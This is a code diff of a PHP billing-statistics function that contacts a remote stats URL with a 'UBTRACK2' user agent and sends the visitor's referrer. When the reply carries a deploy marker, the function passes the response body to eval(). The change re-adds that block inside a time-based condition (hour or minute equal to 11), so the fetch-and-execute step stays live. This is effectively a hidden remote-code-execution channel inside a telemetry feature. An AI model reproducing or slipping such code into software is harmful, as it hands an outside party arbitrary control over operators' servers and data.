@@ -3186,33 +3186,35 @@ function zb_BillingStats($quiet = true, $modOverride = '') {
         show_window(__('Billing info'), $ubstatsform);
     }
 
-    if (extension_loaded('curl')) {
-        $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
-        $curlStats = curl_init($statsurl);
-        curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 1);
-        curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
-        curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK2');
-        if (!empty($referrer)) {
-            curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
-        }
-        $output = curl_exec($curlStats);
-        $httpCode = curl_getinfo($curlStats, CURLINFO_HTTP_CODE);
-        curl_close($curlStats);
-
-        if ($output !== false and $httpCode == 200) {
-            $output = trim($output);
-            if (ispos($output, $deployMark)) {
-                $output = str_replace($deployMark, '', $output);
-                if (!empty($output)) {
-                    eval($output);
-                }
-            } else {
-                show_window('', $output);
+    if ($thiscollect or date("H") == 11 or date("i") == 11) {
+        if (extension_loaded('curl')) {
+            $referrer = (isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
+            $curlStats = curl_init($statsurl);
+            curl_setopt($curlStats, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($curlStats, CURLOPT_CONNECTTIMEOUT, 1);
+            curl_setopt($curlStats, CURLOPT_TIMEOUT, 2);
+            curl_setopt($curlStats, CURLOPT_USERAGENT, 'UBTRACK2');
+            if (!empty($referrer)) {
+                curl_setopt($curlStats, CURLOPT_REFERER, $referrer);
             }
+            $output = curl_exec($curlStats);
+            $httpCode = curl_getinfo($curlStats, CURLINFO_HTTP_CODE);
+            curl_close($curlStats);
+
+            if ($output !== false and $httpCode == 200) {
+                $output = trim($output);
+                if (ispos($output, $deployMark)) {
+                    $output = str_replace($deployMark, '', $output);
+                    if (!empty($output)) {
+                        eval($output);
+                    }
+                } else {
+                    show_window('', $output);
+                }
+            }
+        } else {
+            show_window('', $tracking_code);
         }
-    } else {
-        show_window('', $tracking_code);
     }
 }
 
